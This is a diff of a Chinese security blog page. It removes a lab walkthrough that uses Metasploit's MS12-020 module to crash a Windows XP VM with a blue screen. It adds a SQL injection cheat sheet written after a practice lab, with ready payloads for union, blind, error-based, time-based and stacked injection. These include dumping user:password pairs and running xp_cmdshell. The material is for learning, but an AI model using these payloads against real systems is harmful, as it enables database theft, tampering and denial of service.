@@ -4,11 +4,14 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="ms12-020-导致对方蓝屏, 网络安全，计算机，渗透">
-    <meta name="description" content="本篇文章介绍关于msfconsole模块中ms12-020漏洞的解析。
+    <meta name="keywords" content="sql注入漏洞, 网络安全，计算机，渗透">
+    <meta name="description" content="打完65关的sql靶场，浅浅地整理了一下关于sql注入的知识点。主要是mysql数据库的。
 
 
-实验背景：都是在虚拟机下进行的啦，靶机采用的是winxpens3，确保所用的靶机有相关的漏洞才能攻击成功哦。并且攻击机和靶机要处在同一局域网下才行哒，建议开启仅主机">
+
+
+MySQL● 字段table_schema记录库名，table_name记录表名，column_name记录字段名
+● 在 mysql5 版">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -20,7 +23,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>ms12-020-导致对方蓝屏 | echozt</title>
+    <title>sql注入漏洞 | echozt</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -207,12 +210,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/1.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/6.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">ms12-020-导致对方蓝屏</h1>
+                    <h1 class="description center-align post-title">sql注入漏洞</h1>
                 </div>
             </div>
         </div>
@@ -328,24 +331,12 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/%E6%B8%97%E9%80%8F/">
-                                <span class="chip bg-color">渗透</span>
+                            <a href="/tags/sql%E6%B3%A8%E5%85%A5/">
+                                <span class="chip bg-color">sql注入</span>
                             </a>
                         
-                            <a href="/tags/msfconsole/">
-                                <span class="chip bg-color">msfconsole</span>
-                            </a>
-                        
-                            <a href="/tags/%E6%94%BB%E5%87%BB/">
-                                <span class="chip bg-color">攻击</span>
-                            </a>
-                        
-                            <a href="/tags/%E6%BC%8F%E6%B4%9E/">
-                                <span class="chip bg-color">漏洞</span>
-                            </a>
-                        
-                            <a href="/tags/kali/">
-                                <span class="chip bg-color">kali</span>
+                            <a href="/tags/web%E6%BC%8F%E6%B4%9E/">
+                                <span class="chip bg-color">web漏洞</span>
                             </a>
                         
                     </div>
@@ -356,8 +347,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/msfconsole/" class="post-category">
-                                msfconsole
+                            <a href="/categories/web%E6%BC%8F%E6%B4%9E/" class="post-category">
+                                web漏洞
                             </a>
                         
                     </div>
@@ -370,7 +361,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2022-01-30
+                    2022-04-13
                 </div>
                 
 
@@ -379,7 +370,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    361
+                    1.9k
                 </div>
                 
 
@@ -401,43 +392,144 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>本篇文章介绍关于msfconsole模块中ms12-020漏洞的解析。</p>
+                <p>打完65关的sql靶场，浅浅地整理了一下关于sql注入的知识点。主要是mysql数据库的。</p>
 <span id="more"></span>
 
-<h1 id="实验背景："><a href="#实验背景：" class="headerlink" title="实验背景："></a>实验背景：</h1><p>都是在虚拟机下进行的啦，靶机采用的是winxpens3，确保所用的靶机有相关的漏洞才能攻击成功哦。并且攻击机和靶机要处在同一局域网下才行哒，建议开启仅主机模式哦。还有一点，有些命令无效，可能是因为模式为普通用户模式，在命令前面使用sudo就好了，或者切换为root（su root)</p>
-<h1 id="实验环境："><a href="#实验环境：" class="headerlink" title="实验环境："></a>实验环境：</h1><p>攻击机：kali ip地址：192.168.127.139</p>
-<p>靶机：winxpens3 ip地址：192.168.127.138</p>
-<h1 id="ms12-020（导致对方蓝屏）"><a href="#ms12-020（导致对方蓝屏）" class="headerlink" title="ms12-020（导致对方蓝屏）"></a>ms12-020（导致对方蓝屏）</h1><h2 id="1、配置命令"><a href="#1、配置命令" class="headerlink" title="1、配置命令"></a>1、配置命令</h2><p>确定靶机的3389端口打开</p>
-<p>进入msfconsole，配置如下命令：</p>
-<pre class="line-numbers language-bash"><code class="language-bash">search ms12-020   <span class="token comment" spellcheck="true">#查找ms12-020漏洞</span>
-<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>查看信息，使用如下，这里因为0已经被修复，所以这里只能使用关于1的，不能使用use 0</p>
-<img src="/posts/12eb/10.png" class>
+<!--more-->
 
-<pre class="line-numbers language-bash"><code class="language-bash">use 1
-<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>或者使用如下，</p>
-<pre class="line-numbers language-bash"><code class="language-bash">use auxiliary/dos/windows/rdp/ms12_020_maxchannelids
-<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>选择之后，发现提示信息，按照提示信息配置：</p>
-<pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">set</span> payload linux/x64/meterpreter/reverse_tcp
-<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<img src="/posts/12eb/11.png" class>
+<h1 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h1><p>● 字段table_schema记录库名，table_name记录表名，column_name记录字段名</p>
+<p>● 在 mysql5 版本以后，mysql 默认在数据库中存放在一个叫 infomation_schema 里面</p>
+<p>● 这个库里面有很多表重点是这三个表 columns 、tables、schemata</p>
+<pre class="line-numbers language-bash"><code class="language-bash">columns  存储该用户创建的所有数据库的库名、表名和字段名。
 
-<p>然后查看并配置所需命令：</p>
-<pre class="line-numbers language-bash"><code class="language-bash">show options
+tables   表字段table_schema 、table_name 分别记录着库名和表名
 
-<span class="token keyword">set</span> RHOSTS 192.168.127.138    <span class="token comment" spellcheck="true">#配置靶机地址</span>
-
-<span class="token keyword">set</span> LHOST 192.168.127.139     <span class="token comment" spellcheck="true">#配置攻击机地址</span>
+schemata 表字段schema_name 记录着库的信息
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h2 id="2、运行攻击"><a href="#2、运行攻击" class="headerlink" title="2、运行攻击"></a>2、运行攻击</h2><p>完成前面的配置之后，运行：</p>
-<pre class="line-numbers language-bash"><code class="language-bash">run       <span class="token comment" spellcheck="true">#或者使用exploit,来实现攻击</span>
-<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<img src="/posts/12eb/12.png" class>
+<h1 id="常用函数："><a href="#常用函数：" class="headerlink" title="常用函数："></a>常用函数：</h1><ol>
+<li><p>version()——MySQL 版本</p>
+</li>
+<li><p>user()——数据库用户名</p>
+</li>
+<li><p>database()——数据库名</p>
+</li>
+<li><p>@@datadir——数据库路径</p>
+</li>
+<li><p>@@version_compile_os——操作系统版本</p>
+</li>
+</ol>
+<h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><h3 id="1、sql注入原理"><a href="#1、sql注入原理" class="headerlink" title="1、sql注入原理"></a>1、sql注入原理</h3><p>● 参数用户可控</p>
+<p>● 参数带入数据库查询</p>
+<h3 id="2、判断是否存在注入"><a href="#2、判断是否存在注入" class="headerlink" title="2、判断是否存在注入"></a>2、判断是否存在注入</h3><p>● 数字型注入：/1 和 /0回显不一样。或者传入id=1 and 1=1 和id=1 and 1=2回显不一样等等</p>
+<p>● 字符型注入：’ 和 ‘’ 回显不一样，单数的和双数的单引号回显规不规律</p>
+<h3 id="3、注释符"><a href="#3、注释符" class="headerlink" title="3、注释符"></a>3、注释符</h3><p>● 单行注释：减减加(–+)，减减空格(– )，#</p>
+<p>● 多行注释：/<em>……</em>/</p>
+<h1 id="sql注入分类"><a href="#sql注入分类" class="headerlink" title="sql注入分类"></a>sql注入分类</h1><h2 id="1、union联合注入"><a href="#1、union联合注入" class="headerlink" title="1、union联合注入"></a>1、union联合注入</h2><p>含义：联合查询注入是联合两个表进行注入攻击，使用关键词 union select 对两个表进行联合查询。两个表的字段数要相同，不然会出现报错。</p>
+<h4 id="●-Limit"><a href="#●-Limit" class="headerlink" title="● Limit"></a>● Limit</h4><p>Limit是指限定查询的条数。有三种方式：</p>
+<h5 id="方式一：limit-参数1"><a href="#方式一：limit-参数1" class="headerlink" title="方式一：limit 参数1"></a>方式一：limit 参数1</h5><p>参数1可从1开始，往后递增，表示要查询几条数据。</p>
+<p>例如，limit 1 表示限定查询一条语句。</p>
+<h5 id="方式二：limit-参数1，参数2"><a href="#方式二：limit-参数1，参数2" class="headerlink" title="方式二：limit 参数1，参数2"></a>方式二：limit 参数1，参数2</h5><p>参数1从0开始，表示从第几行（按照索引0作第一行）开始查询，参数2表示要查询的条数。合在一起的意思就是，从参数1开始，查询参数2条语句。</p>
+<p>例如，limit 0,1 表示查询第一条语句，和limit 1等意。</p>
+<h5 id="方式三：limit-参数1-offset-参数2"><a href="#方式三：limit-参数1-offset-参数2" class="headerlink" title="方式三：limit 参数1 offset 参数2"></a>方式三：limit 参数1 offset 参数2</h5><p>参数1表示限定要查询几条，参数2表示从第几行（按照索引为0作第一行）开始查询。</p>
+<p>例如：limit 1 offset 0 表示查询第一条参数。</p>
+<h3 id="（1）判断"><a href="#（1）判断" class="headerlink" title="（1）判断"></a>（1）判断</h3><p>传入1正常，传入1’报错</p>
+<p>传入1’ and ‘1’=’1 和传入 1’ and ‘1’=’2  页面回显不一样</p>
+<h3 id="（2）判断字段数"><a href="#（2）判断字段数" class="headerlink" title="（2）判断字段数"></a>（2）判断字段数</h3><p>公式：order by n-1    到n出错时，则字段数为n-1</p>
+<h3 id="（3）获取敏感信息"><a href="#（3）获取敏感信息" class="headerlink" title="（3）获取敏感信息"></a>（3）获取敏感信息</h3><p> -1 union select 1,2–+</p>
+<p> (-1是让前面的表查询的内容不存在，将1或2可替换成version(),database(),user()等）</p>
+<pre class="line-numbers language-bash"><code class="language-bash">例1：-1<span class="token string">' union select 1,user()
 
-<p>查看到出现seems down 表示攻击成功，已经致使目标机蓝屏了。</p>
-<img src="/posts/12eb/13.png" class>
+例2：-1'</span> union <span class="token keyword">select</span> 1,group_concat<span class="token punctuation">(</span>user<span class="token punctuation">(</span><span class="token punctuation">)</span>,0x3a,database<span class="token punctuation">(</span><span class="token punctuation">))</span>--+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<h3 id="（4）获取表"><a href="#（4）获取表" class="headerlink" title="（4）获取表"></a>（4）获取表</h3><pre class="line-numbers language-bash"><code class="language-bash">-1' union <span class="token keyword">select</span> 1,<span class="token punctuation">(</span>select table_name from information_schema.tables where table_schema<span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span> limit 0,1<span class="token punctuation">)</span>--+
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="（5）获取字段"><a href="#（5）获取字段" class="headerlink" title="（5）获取字段"></a>（5）获取字段</h3><pre class="line-numbers language-bash"><code class="language-bash">-1’ union <span class="token keyword">select</span> 1,<span class="token punctuation">(</span>select column_name from information_schema.columns where table_name<span class="token operator">=</span><span class="token string">'users'</span> limit 0,1<span class="token punctuation">)</span>--+
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="（6）查询某个表的内容"><a href="#（6）查询某个表的内容" class="headerlink" title="（6）查询某个表的内容"></a>（6）查询某个表的内容</h3><h5 id="例如：获取users表的user和password"><a href="#例如：获取users表的user和password" class="headerlink" title="例如：获取users表的user和password"></a>例如：获取users表的user和password</h5><pre class="line-numbers language-bash"><code class="language-bash">-1' union <span class="token keyword">select</span> 1,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>user,0x3a,password<span class="token punctuation">)</span> from <span class="token function">users</span> limit 1<span class="token punctuation">)</span>--+
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h2 id="2、Boolean布尔型盲注"><a href="#2、Boolean布尔型盲注" class="headerlink" title="2、Boolean布尔型盲注"></a>2、Boolean布尔型盲注</h2><p>含义：在页面中不会显示数据库信息，一般情况下只会显示对与错的内容。</p>
+<h4 id="if-1-1-1-0"><a href="#if-1-1-1-0" class="headerlink" title="if(1=1,1,0)"></a>if(1=1,1,0)</h4><p>● if(参数1，参数2，参数3）</p>
+<p>● 参数1是语句，参数2表示正确时显示，参数3表示错误时显示</p>
+<h4 id="substr"><a href="#substr" class="headerlink" title="substr"></a>substr</h4><p>● substr(参数1，参数2，参数3）</p>
+<p>● 参数1是字符串，参数2是开始截取（索引从1开始），参数3是截取的长度</p>
+<h3 id="（1）判断-1"><a href="#（1）判断-1" class="headerlink" title="（1）判断"></a>（1）判断</h3><p>传入1正常，传入1’报错</p>
+<p>传入1’ and ‘1’=’1 和传入 1’ and ‘1’=’2  页面回显不一样</p>
+<h3 id="（2）获取敏感信息"><a href="#（2）获取敏感信息" class="headerlink" title="（2）获取敏感信息"></a>（2）获取敏感信息</h3><pre class="line-numbers language-bash"><code class="language-bash">1<span class="token string">' and if(substr(user(),1,1)='</span>a',1,0<span class="token punctuation">)</span>--+
+
+判断数据库用户名第一个字符是否为a，是则返回1，否则返回0
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<h3 id="（3）获取数据库名"><a href="#（3）获取数据库名" class="headerlink" title="（3）获取数据库名"></a>（3）获取数据库名</h3><pre class="line-numbers language-bash"><code class="language-bash">1<span class="token string">' and if(substr(database(),1,1)='</span>a',1,0<span class="token punctuation">)</span>--+
+
+可抓包对变量1：长度，变量2：a~zA~Z0~9._@  这两个变量进行爆破
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<h3 id="（4）获取表名"><a href="#（4）获取表名" class="headerlink" title="（4）获取表名"></a>（4）获取表名</h3><pre class="line-numbers language-bash"><code class="language-bash">1’ and if<span class="token punctuation">(</span>substr<span class="token punctuation">((</span>select table_name from information_schema.tables where table_schema<span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span> limit 1<span class="token punctuation">)</span>,1,1<span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'a'</span>,1,0<span class="token punctuation">)</span>--+
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="（5）获取字段名"><a href="#（5）获取字段名" class="headerlink" title="（5）获取字段名"></a>（5）获取字段名</h3><pre class="line-numbers language-bash"><code class="language-bash">1<span class="token string">' and if(substr((select column_name form information_schema.columns where table_name='</span><span class="token function">users</span><span class="token string">' limit 1,1),1,1)='</span>a',1,0<span class="token punctuation">)</span>--+
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="（6）获取表的内容"><a href="#（6）获取表的内容" class="headerlink" title="（6）获取表的内容"></a>（6）获取表的内容</h3><pre class="line-numbers language-bash"><code class="language-bash">1’ and if<span class="token punctuation">(</span>substr<span class="token punctuation">((</span>select concat<span class="token punctuation">(</span>user,0x3a,password<span class="token punctuation">)</span>from <span class="token function">users</span> limit 1<span class="token punctuation">)</span>,1,1<span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'a'</span>,1,0<span class="token punctuation">)</span>--+
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h2 id="3、报错注入"><a href="#3、报错注入" class="headerlink" title="3、报错注入"></a>3、报错注入</h2><p>含义：数据库显错是指，数据库在执行时，遇到语法不对，会显示报错信息。</p>
+<h3 id="（1）判断-2"><a href="#（1）判断-2" class="headerlink" title="（1）判断"></a>（1）判断</h3><p>输入单引号 如果报错有可能存在报错注入，如果拼接 SQL 语句带入到 mysql 执行即存在报错注入</p>
+<h3 id="（2）获取库名"><a href="#（2）获取库名" class="headerlink" title="（2）获取库名"></a>（2）获取库名</h3><pre class="line-numbers language-bash"><code class="language-bash">1' and info<span class="token punctuation">(</span><span class="token punctuation">)</span>--+
+
+原理：会报错显示当前库（库名会显示出来）不存在这个函数
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<h3 id="（3）获取敏感信息-1"><a href="#（3）获取敏感信息-1" class="headerlink" title="（3）获取敏感信息"></a>（3）获取敏感信息</h3><h4 id="●-updatexml-函数"><a href="#●-updatexml-函数" class="headerlink" title="● updatexml()函数"></a>● updatexml()函数</h4><pre class="line-numbers language-bash"><code class="language-bash">1' and updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select user<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span>--+
+
+可将user<span class="token punctuation">(</span><span class="token punctuation">)</span>换成database<span class="token punctuation">(</span><span class="token punctuation">)</span>，version<span class="token punctuation">(</span><span class="token punctuation">)</span>等
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<h4 id="●-extractvalue-函数"><a href="#●-extractvalue-函数" class="headerlink" title="● extractvalue()函数"></a>● extractvalue()函数</h4><pre class="line-numbers language-bash"><code class="language-bash">1' and extractvalue<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select user<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e<span class="token punctuation">))</span>--+
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h4 id="●-floor-函数"><a href="#●-floor-函数" class="headerlink" title="● floor()函数"></a>● floor()函数</h4><pre class="line-numbers language-bash"><code class="language-bash">1' and <span class="token punctuation">(</span>select count<span class="token punctuation">(</span>*<span class="token punctuation">)</span> from information_schema.tables group by concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select user<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e,floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span>0<span class="token punctuation">)</span>*2<span class="token punctuation">))</span><span class="token punctuation">)</span>--+
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h2 id="4、时间注入（延时注入，基于时间的SQL盲注）"><a href="#4、时间注入（延时注入，基于时间的SQL盲注）" class="headerlink" title="4、时间注入（延时注入，基于时间的SQL盲注）"></a>4、时间注入（延时注入，基于时间的SQL盲注）</h2><p>含义：时间注入又名延时注入，属于盲注入的一种，通常是某个注入点无法通过布尔型注入获取数据而采用一种突破注入的技巧。跟布尔型差不多，只是将布尔型如果成功显示1换成如果成功延时多少秒。</p>
+<h4 id="sleep"><a href="#sleep" class="headerlink" title="sleep()"></a>sleep()</h4><p>sleep() 是延时的意思，sleep(10)就是数据库延时10 秒返回内容。</p>
+<h3 id="（1）判断-3"><a href="#（1）判断-3" class="headerlink" title="（1）判断"></a>（1）判断</h3><pre class="line-numbers language-bash"><code class="language-bash">id<span class="token operator">=</span>1' and sleep<span class="token punctuation">(</span>5<span class="token punctuation">)</span>--+  存在延时
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="（2）获取敏感信息-1"><a href="#（2）获取敏感信息-1" class="headerlink" title="（2）获取敏感信息"></a>（2）获取敏感信息</h3><pre class="line-numbers language-bash"><code class="language-bash">1<span class="token string">' and if(substr(user(),1,1)='</span>a',sleep<span class="token punctuation">(</span>5<span class="token punctuation">)</span>,0<span class="token punctuation">)</span>--+
+
+判断数据库用户名第一个字符是否为a，是则返回1，否则返回0
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<h3 id="（3）获取数据库名-1"><a href="#（3）获取数据库名-1" class="headerlink" title="（3）获取数据库名"></a>（3）获取数据库名</h3><pre class="line-numbers language-bash"><code class="language-bash">1<span class="token string">' and if(substr(database(),1,1)='</span>s',sleep<span class="token punctuation">(</span>5<span class="token punctuation">)</span>,0<span class="token punctuation">)</span>--+
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h2 id="5、堆叠注入（多语句查询注入）"><a href="#5、堆叠注入（多语句查询注入）" class="headerlink" title="5、堆叠注入（多语句查询注入）"></a>5、堆叠注入（多语句查询注入）</h2><p>含义：可以执行多条sql语句，语句之间以分号隔开。</p>
+<p>堆叠注入主要用来实现数据库的增删查改操作：</p>
+<h3 id="MySQL："><a href="#MySQL：" class="headerlink" title="MySQL："></a>MySQL：</h3><h4 id="（1）新建一个表"><a href="#（1）新建一个表" class="headerlink" title="（1）新建一个表"></a>（1）新建一个表</h4><pre class="line-numbers language-bash"><code class="language-bash">Select * from <span class="token function">users</span> where id<span class="token operator">=</span>1<span class="token punctuation">;</span>create table <span class="token function">test</span> like <span class="token function">users</span><span class="token punctuation">;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h4 id="（2）删除表"><a href="#（2）删除表" class="headerlink" title="（2）删除表"></a>（2）删除表</h4><pre class="line-numbers language-bash"><code class="language-bash">Select * from <span class="token function">users</span> where id<span class="token operator">=</span>1<span class="token punctuation">;</span>drop table <span class="token function">test</span><span class="token punctuation">;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h4 id="（3）查询数据"><a href="#（3）查询数据" class="headerlink" title="（3）查询数据"></a>（3）查询数据</h4><pre class="line-numbers language-bash"><code class="language-bash">Select * from <span class="token function">users</span> where id<span class="token operator">=</span>1<span class="token punctuation">;</span><span class="token keyword">select</span> 1,2,3<span class="token punctuation">;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h4 id="（4）加载文件"><a href="#（4）加载文件" class="headerlink" title="（4）加载文件"></a>（4）加载文件</h4><pre class="line-numbers language-bash"><code class="language-bash">Select * from <span class="token function">users</span> where id<span class="token operator">=</span>1<span class="token punctuation">;</span><span class="token keyword">select</span> load_file<span class="token punctuation">(</span><span class="token string">'C:/1.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h4 id="（5）修改数据"><a href="#（5）修改数据" class="headerlink" title="（5）修改数据"></a>（5）修改数据</h4><pre class="line-numbers language-bash"><code class="language-bash">Select * from <span class="token function">users</span> where id<span class="token operator">=</span>1<span class="token punctuation">;</span>insert into users<span class="token punctuation">(</span>id,username,password<span class="token punctuation">)</span> values<span class="token punctuation">(</span><span class="token string">'100'</span>,<span class="token string">'new'</span>,<span class="token string">'new'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="SqlServer："><a href="#SqlServer：" class="headerlink" title="SqlServer："></a>SqlServer：</h3><h4 id="（1）新建一个表-1"><a href="#（1）新建一个表-1" class="headerlink" title="（1）新建一个表"></a>（1）新建一个表</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">select</span> * from <span class="token function">test</span><span class="token punctuation">;</span>create table sc3<span class="token punctuation">(</span>ss CHAR<span class="token punctuation">(</span>8<span class="token punctuation">))</span><span class="token punctuation">;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h4 id="（2）删除表-1"><a href="#（2）删除表-1" class="headerlink" title="（2）删除表"></a>（2）删除表</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">select</span> * from <span class="token function">test</span><span class="token punctuation">;</span>drop table sc3<span class="token punctuation">;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h4 id="（3）查询数据-1"><a href="#（3）查询数据-1" class="headerlink" title="（3）查询数据"></a>（3）查询数据</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">select</span> 1,2,3<span class="token punctuation">;</span><span class="token keyword">select</span> * from <span class="token function">test</span><span class="token punctuation">;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h4 id="（4）修改数据"><a href="#（4）修改数据" class="headerlink" title="（4）修改数据"></a>（4）修改数据</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">select</span> * from <span class="token function">test</span><span class="token punctuation">;</span>update <span class="token function">test</span> <span class="token keyword">set</span> name<span class="token operator">=</span><span class="token string">'test'</span> where id<span class="token operator">=</span>3<span class="token punctuation">;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h4 id="（5）存储过程的执行"><a href="#（5）存储过程的执行" class="headerlink" title="（5）存储过程的执行"></a>（5）存储过程的执行</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">select</span> * from <span class="token function">test</span> where id<span class="token operator">=</span>1<span class="token punctuation">;</span><span class="token function">exec</span> master<span class="token punctuation">..</span>xp_cmdshell <span class="token string">'ipconfig'</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="Oracle不能使用堆叠注入"><a href="#Oracle不能使用堆叠注入" class="headerlink" title="Oracle不能使用堆叠注入"></a>Oracle不能使用堆叠注入</h3><h3 id="Postgresql："><a href="#Postgresql：" class="headerlink" title="Postgresql："></a>Postgresql：</h3><h4 id="（1）新建一个表-2"><a href="#（1）新建一个表-2" class="headerlink" title="（1）新建一个表"></a>（1）新建一个表</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">select</span> * from user_test<span class="token punctuation">;</span>create table user_data<span class="token punctuation">(</span>id DATE<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h4 id="（2）删除表-2"><a href="#（2）删除表-2" class="headerlink" title="（2）删除表"></a>（2）删除表</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">select</span> * from user_test<span class="token punctuation">;</span>delete from user_data<span class="token punctuation">;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h4 id="（3）查询数据-2"><a href="#（3）查询数据-2" class="headerlink" title="（3）查询数据"></a>（3）查询数据</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">select</span> * from user_test<span class="token punctuation">;</span><span class="token keyword">select</span> 1,2,3<span class="token punctuation">;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h4 id="（4）修改数据-1"><a href="#（4）修改数据-1" class="headerlink" title="（4）修改数据"></a>（4）修改数据</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">select</span> * from user_test<span class="token punctuation">;</span>update user_test <span class="token keyword">set</span> name<span class="token operator">=</span><span class="token string">'modify'</span> where name<span class="token operator">=</span><span class="token string">'张三'</span><span class="token punctuation">;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h2 id="6、二次注入"><a href="#6、二次注入" class="headerlink" title="6、二次注入"></a>6、二次注入</h2><p>含义：将可能导致sql 注入的字符先存入到数据库中，当再次调用这个恶意构造的字符时，就可以触发sql注入。</p>
+<p>原理：插入恶意数据库——&gt;引用恶意数据</p>
+<h2 id="7、宽字节注入"><a href="#7、宽字节注入" class="headerlink" title="7、宽字节注入"></a>7、宽字节注入</h2><p>产生原因：数据库编码与PHP编码设置为不同的两个编码。</p>
+<p> Big5和GBK字符集有可能会存在宽字节注入，utf-8和gb2312没有。Mysql在使用GBK编码时，会认为两个字符为一个汉字。</p>
+<h4 id="思路一："><a href="#思路一：" class="headerlink" title="思路一："></a>思路一：</h4><p>%df吃掉\  原因在于urldecode(‘)=%5c%27,而我们在前面添加%df，就形成了%df%5c%27,mysql在GBK编码中前两个字当做一个汉字，此时%27就会作为一个单独的字符，也就是’</p>
+<h4 id="思路二："><a href="#思路二：" class="headerlink" title="思路二："></a>思路二：</h4><p>将&#39;中的\过滤掉。可以构造%**%5c%5c%27，后面的%5c会被前面的%5c给注释掉。</p>
+<h1 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h1><p>最后放张上面知识的思维导图版吧</p>
+<p>&lt;<img src="/posts/b737/1.png" class></p>
 
                 
             </div>
@@ -464,7 +556,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://echozt.github.io/posts/12eb.html">https://echozt.github.io/posts/12eb.html</a>
+                    <a href="https://echozt.github.io/posts/b737.html">https://echozt.github.io/posts/b737.html</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -502,24 +594,12 @@
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/%E6%B8%97%E9%80%8F/">
-                                    <span class="chip bg-color">渗透</span>
+                                <a href="/tags/sql%E6%B3%A8%E5%85%A5/">
+                                    <span class="chip bg-color">sql注入</span>
                                 </a>
                             
-                                <a href="/tags/msfconsole/">
-                                    <span class="chip bg-color">msfconsole</span>
-                                </a>
-                            
-                                <a href="/tags/%E6%94%BB%E5%87%BB/">
-                                    <span class="chip bg-color">攻击</span>
-                                </a>
-                            
-                                <a href="/tags/%E6%BC%8F%E6%B4%9E/">
-                                    <span class="chip bg-color">漏洞</span>
-                                </a>
-                            
-                                <a href="/tags/kali/">
-                                    <span class="chip bg-color">kali</span>
+                                <a href="/tags/web%E6%BC%8F%E6%B4%9E/">
+                                    <span class="chip bg-color">web漏洞</span>
                                 </a>
                             
                         </div>
@@ -693,50 +773,52 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
